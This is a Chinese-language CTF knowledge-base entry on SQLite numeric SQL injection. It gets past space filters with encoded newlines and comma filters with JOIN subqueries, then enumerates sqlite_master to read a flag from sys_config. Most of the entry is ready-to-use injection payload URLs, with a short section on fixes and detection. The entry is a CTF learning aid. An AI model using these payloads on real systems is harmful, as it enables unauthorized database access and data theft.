---
id: web-generic-sqli-sqlite-newline-join-comma-bypass
title: SQLite 注入：%0a 绕过空格过滤、JOIN 子查询绕过逗号过滤，查 sqlite_master 取 flag
type: scenario
domain: web
path: web/generic/sqli
technique: sqlite-newline-join-comma-filter-bypass
tags:
- sqli
- sqlite
- waf-bypass
- space-filter
- comma-filter
- union
- join
- sqlite-master
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V195
  verified_at: '2026-11-06T23:11:50+08:00'
  notes: 已对照原文核对；%0a + JOIN 无逗号 payload 与 SQLite 回显截图一致；未复跑。
url: /docs/web/generic/sqli/web-generic-sqli-sqlite-newline-join-comma-bypass/
draft: false
kb_aliases:
- SQLite 注入
- '%0a 绕过空格'
- JOIN 绕过逗号
- union select * from join
- sqlite_master
- sys_config flag
- 小E的管理系统
---

## 一句话结论

数字型 SQLite 注入点在过滤空格和逗号时，可以用 URL 编码换行 `%0a` 代替空格，用 `UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN ...` 代替 `SELECT 1,2,3,...` 绕过逗号过滤；确认 5 列后用 `sqlite_master` 枚举表名/建表 SQL，最终从 `sys_config.config_value` 读出 flag。

## 原理

- **数字型注入**：`id=2-1` 返回节点 1 的结果，说明参数进入 SQL 的数值上下文（未加引号），可直接拼接 `ORDER BY`/`UNION`。
- **空格过滤与 `%0a`**：SQLite 把换行符（0x0A）视为空白分隔符；URL 中的 `%0a` 解码后进入 SQL，可以替代空格分隔关键字，绕过只过滤 `' '` 的 WAF。
- **逗号过滤与 JOIN 子查询**：`UNION SELECT 1,2,3,4,5` 需要逗号；SQLite 支持 `SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN ...`，每个子查询返回一行一列，`JOIN`（无 `ON` 时是交叉连接）把它们组合成一行五列，从而在没有逗号的情况下构造 5 列结果。
- **列数探测**：先 `id=1%0aorder%0aby%0a5` 判断 5 列；`ORDER BY` 的列号超过实际列数会报错/无结果。
- **sqlite_master 枚举**：SQLite 的系统表 `sqlite_master` 保存所有表/索引的 `type`、`name`、`tbl_name`、`sql`。用 `group_concat(tbl_name)` 列出表名，再用 `group_concat(sql)` 看建表语句，定位 `sys_config` 等配置表。
- **读数据**：在 `sys_config` 中查到 `config_key/config_value`，把 `config_value` 放到 `UNION` 的回显列（第 1 列）即可读出 flag。
- **为什么成立**：过滤只针对字面空格/逗号，而 SQL 方言有等价语法（换行、JOIN、子查询）；参数化查询缺失使注入成立。

## 触发条件

- 后端为 SQLite，存在字符串拼接的数值型注入点（如 `id`）。
- WAF/代码只过滤空格或逗号，未做参数化查询/白名单。
- 注入查询的列数可探测，且 `UNION` 结果的列类型兼容（SQLite 动态类型，通常宽松）。
- 数据库用户可读 `sqlite_master` 与业务表（SQLite 默认同一文件权限）。
- 应用会把查询结果回显到页面/JSON。

## 利用步骤

1. 确认注入类型：`id=2-1` 与 `id=1` 返回相同结果，说明数值型；`id=1'` 观察报错。
2. 探测列数：`/query.php?id=1%0aorder%0aby%0a5`；调整 5 直到正常/报错边界。
3. 构造无逗号 UNION：
   ```text
   id=1%0aunion%0aselect%0a*%0afrom%0a(select%0a1)a%0ajoin(select%0a2)b%0ajoin(select%0a3)c%0ajoin(select%0a4)d%0ajoin(select%0a5)e
   ```
   确认回显位（本例第 1 列）。
4. 列表名：
   ```text
   id=1%0aunion%0aselect%0a*%0afrom%0a(select%0a1)a%0ajoin(select%0a2)b%0ajoin(select%0a3)c%0ajoin(select%0a4)d%0ajoin(select%0agroup_concat(tbl_name)%0aFROM%0asqlite_master)e
   ```
5. 看建表 SQL：把 `group_concat(tbl_name)` 换成 `group_concat(sql)`，找到 `sys_config` 的列名。
6. 读 flag：
   ```text
   id=1%0aunion%0aselect%0a*%0afrom%0a(select%0a1)a%0ajoin(select%0a2)b%0ajoin(select%0a3)c%0ajoin(select%0a4)d%0ajoin(select%0agroup_concat(config_value)%0aFROM%0asys_config)e
   ```
7. 若结果被截断，用 `substr`/`limit` 分段；若 `UNION` 被拦，尝试 `UNION VALUES`、`UNION ALL`、大小写/注释混淆。

## PoC

```text
# 列数
/query.php?id=1%0aorder%0aby%0a5

# 无逗号 5 列 UNION
/query.php?id=1%0aunion%0aselect%0a*%0afrom%0a(select%0a1)a%0ajoin(select%0a2)b%0ajoin(select%0a3)c%0ajoin(select%0a4)d%0ajoin(select%0a5)e

# 表名
/query.php?id=1%0aunion%0aselect%0a*%0afrom%0a(select%0a1)a%0ajoin(select%0a2)b%0ajoin(select%0a3)c%0ajoin(select%0a4)d%0ajoin(select%0agroup_concat(tbl_name)%0aFROM%0asqlite_master)e

# 建表 SQL
/query.php?id=1%0aunion%0aselect%0a*%0afrom%0a(select%0a1)a%0ajoin(select%0a2)b%0ajoin(select%0a3)c%0ajoin(select%0a4)d%0ajoin(select%0agroup_concat(sql)%0aFROM%0asqlite_master)e

# 读 sys_config.config_value
/query.php?id=1%0aunion%0aselect%0a*%0afrom%0a(select%0a1)a%0ajoin(select%0a2)b%0ajoin(select%0a3)c%0ajoin(select%0a4)d%0ajoin(select%0agroup_concat(config_value)%0aFROM%0asys_config)e
```

## 变体与关联

- 变体：空格过滤可用 `%09`（tab）、`%0b`、`%0c`、`%0d`、`/**/` 注释、括号等替代；不同数据库/驱动支持不同。
- 变体：逗号过滤可用 `JOIN`、`UNION VALUES`、`CROSS JOIN`、`WHERE` 子查询、`GROUP_CONCAT` 等绕过。
- 变体：SQLite 无 `information_schema`，系统表是 `sqlite_master`/`sqlite_schema`；也可用 `pragma_table_info` 看列。
- 关联：[[web-generic-sqli-sqlite-union-values-select-filter-bypass]]（UNION VALUES 绕过 SELECT 过滤）、[[web-generic-sqli-sqlite-boolean-blind-tab-bypass]]（SQLite 布尔盲注 + tab 绕过）、[[web-generic-sqli-mysql-outfile-general-log-webshell]]（其它数据库的写文件链）。
- 边界：参数化查询、严格白名单、数据库用户无权限、WAF 同时拦截换行/JOIN/UNION、结果不回显时，该链需改用盲注或其它技巧。

## 检测与防御

- **修复**：所有 SQL 使用参数化查询/预编译；`id` 强制转换为整数；不要拼接用户输入。
- **最小权限**：SQLite 文件权限限制，Web 进程只读业务表；避免把配置/密钥放在业务库。
- **WAF/检测**：监控 `%0a`/`%09` 等编码空白、`UNION`+`JOIN` 组合、`sqlite_master`、`group_concat`、`order by` 异常参数；对数字参数出现非数字字符告警。
- **响应**：确认注入后检查数据库是否被拖取/篡改，轮换库中密钥；修复查询并复测同类参数。
